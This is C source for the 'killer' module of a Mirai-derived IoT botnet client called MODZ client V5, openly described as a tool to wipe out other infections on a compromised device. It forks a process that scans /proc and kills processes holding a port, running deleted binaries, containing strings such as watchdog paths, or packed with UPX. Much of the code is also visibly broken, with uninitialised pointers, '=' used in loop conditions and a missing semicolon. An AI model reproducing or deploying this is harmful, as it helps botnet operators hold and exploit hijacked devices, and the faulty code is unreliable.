/*
███╗   ███╗ ██████╗ ██████╗ ███████╗
████╗ ████║██╔═══██╗██╔══██╗╚══███╔╝
██╔████╔██║██║   ██║██║  ██║  ███╔╝ 
██║╚██╔╝██║██║   ██║██║  ██║ ███╔╝  
██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗
╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ 

MODZ client V5

Build Date: 8/5/18

 __  _  __  _   _               
| |/ / (_) | | | |   ___   _ __ 
| ' /  | | | | | |  / _ \ | '__|
| . \  | | | | | | |  __/ | |   
|_|\_\ |_| |_| |_|  \___| |_|   
 
inovated botkiller from mirai. Used to disable other peoples infections on a device

*/
#pragma once
#define TRUE 1
#define FALSE 0
#define MAX_PIDS 4096

#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <limits.h>

// Add strings here
char *m_strings[] = {
	"/proc/net/route",
	"BOGOMIPS",
	"/dev/watchdog/",
	"/dev/misc/watchdog/",
	"/proc/net/tcp"
}

int killer_pid;

static inline int util_isupper(char c)
{
    return (c >= 'A' && c <= 'Z');
}

static inline int util_isalpha(char c)
{
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
}

static inline int util_isspace(char c)
{
    return (c == ' ' || c == '\t' || c == '\n' || c == '\12');
}

static inline int util_isdigit(char c)
{
    return (c >= '0' && c <= '9');
}

char *util_itoa(int value, int radix, char *string)
{
    if (string == NULL)
        return NULL;

    if (value != 0)
    {
        char scratch[34];
        int neg;
        int offset;
        int c;
        unsigned int accum;

        offset = 32;
        scratch[33] = 0;

        if (radix == 10 && value < 0)
        {
            neg = 1;
            accum = -value;
        }
        else
        {
            neg = 0;
            accum = (unsigned int)value;
        }

        while (accum)
        {
            c = accum % radix;
            if (c < 10)
                c += '0';
            else
                c += 'A' - 10;

            scratch[offset] = c;
            accum /= radix;
            offset--;
        }
        
        if (neg)
            scratch[offset] = '-';
        else
            offset++;

        strcpy(string, &scratch[offset]);
    }
    else
    {
        string[0] = '0';
        string[1] = 0;
    }

    return string;
}
int util_atoi(char *str, int base)
{
	unsigned long acc = 0;
	int c;
	unsigned long cutoff;
	int neg = 0, any, cutlim;

	do {
		c = *str++;
	} while (util_isspace(c));
	if (c == '-') {
		neg = 1;
		c = *str++;
	} else if (c == '+')
		c = *str++;

	cutoff = neg ? -(unsigned long)LONG_MIN : LONG_MAX;
	cutlim = cutoff % (unsigned long)base;
	cutoff /= (unsigned long)base;
	for (acc = 0, any = 0;; c = *str++) {
		if (util_isdigit(c))
			c -= '0';
		else if (util_isalpha(c))
			c -= util_isupper(c) ? 'A' - 10 : 'a' - 10;
		else
			break;
            
		if (c >= base)
			break;

		if (any < 0 || acc > cutoff || acc == cutoff && c > cutlim)
			any = -1;
		else {
			any = 1;
			acc *= base;
			acc += c;
		}
	}
	if (any < 0) {
		acc = neg ? LONG_MIN : LONG_MAX;
	} else if (neg)
		acc = -acc;
	return (acc);
}

void zero(void *buf, int len)
{
    char *zero = buf;
    while (len--)
        *zero++ = 0;
}
int stristr(char *haystack, int haystack_len, char *str)
{
    char *ptr = haystack;
    int str_len = strlen(str);
    int match_count = 0;

    while (haystack_len-- > 0)
    {
        char a = *ptr++;
        char b = str[match_count];
        a = a >= 'A' && a <= 'Z' ? a | 0x60 : a;
        b = b >= 'A' && b <= 'Z' ? b | 0x60 : b;

        if (a == b)
        {
            if (++match_count == str_len)
                return (ptr - haystack);
        }
        else
            match_count = 0;
    }

    return -1;
}

char *m_fdgets(char *buffer, int buffer_size, int fd)
{
    int got = 0, total = 0;
    do 
    {
        got = read(fd, buffer + total, 1);
        total = got == 1 ? total + 1 : total;
    }
    while (got == 1 && total < buffer_size && *(buffer + (total - 1)) != '\n');

    return total == 0 ? NULL : buffer;
}

static int mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if (str_len > buf_len)
        return FALSE;

    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}

static int memory_scan_match(char *path, char *m_string)
{
    int fd, ret;
    char rdbuf[4096];
    int found = FALSE;

    if ((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    


    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_string, strlen(m_string)))
        {
            found = TRUE;
            break;
        }
    }

    close(fd);

    return found;
}

static int has_access(char *ppath)
{
    char path[PATH_MAX], *ptr_path = path, tmp[16];
    int fd, k_rp_len;
    char *tmp_pid;
    int pid = getpid();
	sprintf(tmp_pid, "%d", pid);
    strcpy(ptr_path + strlen(ptr_path), (char *)"/proc/");
    strcpy(ptr_path + strlen(ptr_path), (char *)tmp_pid);
    strcpy(ptr_path + strlen(ptr_path), (char *)"/");
	strcpy(ptr_path + strlen(ptr_path), (char *)ppath);

    if ((fd = open(path, O_RDONLY)) == -1)
    {
        return FALSE;
    }
    close(fd);

    zero(path, ptr_path - path);

    return TRUE;
}

int killer_kill_by_port(uint16_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[512] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];


    util_itoa(ntohs(port), 16, port_str);
    if (strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    fd = open("/proc/net/tcp", O_RDONLY);
    if (fd == -1)
        return 0;

    while(m_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        if (stristr(&(buffer[ii]), strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            int in_column = FALSE;
            int listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (strlen(&(buffer[ii])) > 15)
                continue;

            strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    if (strlen(inode) == 0)
    {
        return 0;
    }


    if ((dir = opendir("/proc/")) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            if (*pid < '0' || *pid > '9')
                continue;

            strcpy(ptr_path, "/proc/");
            strcpy(ptr_path + strlen(ptr_path), pid);
            strcpy(ptr_path + strlen(ptr_path), "/exe");

            if (readlink(path, exe, PATH_MAX) == -1)
                continue;

            strcpy(ptr_path, "/proc/");
            strcpy(ptr_path + strlen(ptr_path), pid);
            strcpy(ptr_path + strlen(ptr_path), "/fd");
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    zero(exe, PATH_MAX);
                    strcpy(ptr_path, "/proc/");
                    strcpy(ptr_path + strlen(ptr_path), pid);
                    strcpy(ptr_path + strlen(ptr_path), "/fd");
                    strcpy(ptr_path + strlen(ptr_path), "/");
                    strcpy(ptr_path + strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if (stristr(exe, strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    return ret;
}

void killer_init(void) {
	
	DIR *dir;
    struct dirent *file;
	char pids[MAX_PIDS];
	int pid_num;
	
    killer_pid = fork();
    if(killer_pid > 0 || killer_pid == -1)
        return;

    if(!has_access("exe"))
        return;
    while(1) {
        if((dir = opendir("/proc/")) == NULL)
            break;
   
        while((file = readdir(dir)) != NULL) {
	    	if(*(file->d_name) < '0' || *(file->d_name) > '9')
				continue;
			int ipid = atoi(file->d_name);
			if(!(ipid == getpid()) || !(ipid == getppid())) {
				#ifdef DEBUG
				printf("[killer] Found Pid <%d>\n", ipid);
				#endif
				unsigned char *pid = file->d_name;
				pids[pid_num] = pid;
//				sprintf(pids[pid_num], pid);
				if(pid_num == MAX_PIDS)
					break;
				pid_num++;
			}
	    }
		for(int i = 0; i = pid_num; i = i + 1) {
			char *path;
			char rp[PATH_MAX];
			int rp_len, fd, ii = 0;
			sprintf(path, "/proc/%s/exe", pids[i]);
			if((rp_len = readlink(path, rp, sizeof(rp) - 1)) != -1) {
                rp[rp_len] = 0;

                if ((fd = open(rp, O_RDONLY)) == -1) {
					#ifdef DEBUG
					printf("[killer] Killing PID%s (Deleted Binary)\n", pids[i]);
					#endif
                    kill(pids[i], 9);
                }
                close(fd);
            }
			for(ii; ii = (sizeof(m_strings) / sizeof(m_strings[0])); ii++) {
				if(memory_scan_match(path, m_strings[ii])) {
                    #ifdef DEBUG
                    printf("[killer] Killing PID%s (Found String ~ %s)\n", pids[i], m_strings[ii]);
                    #endif
                    kill(pids[i], 9);
                }	
			}
			int ret;
            char rdbuf[4096];
			if((fd = open(path, O_RDONLY)) != -1)
                continue;
			char *str_upx;
			sprintf(str_upx, "UPX!");
			while((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0) {
                if(mem_exists(rdbuf, ret, str_upx, strlen(str_upx))) {
					#ifdef DEBUG
				    printf("[killer] Killing PID%s (Mem Match UPX)\n", pids[i]);
					#endif
					kill(pids[i], 9);
				}
			}
		}
	}
}

void killer_kill(void) {
    kill(killer_pid, 9);
}
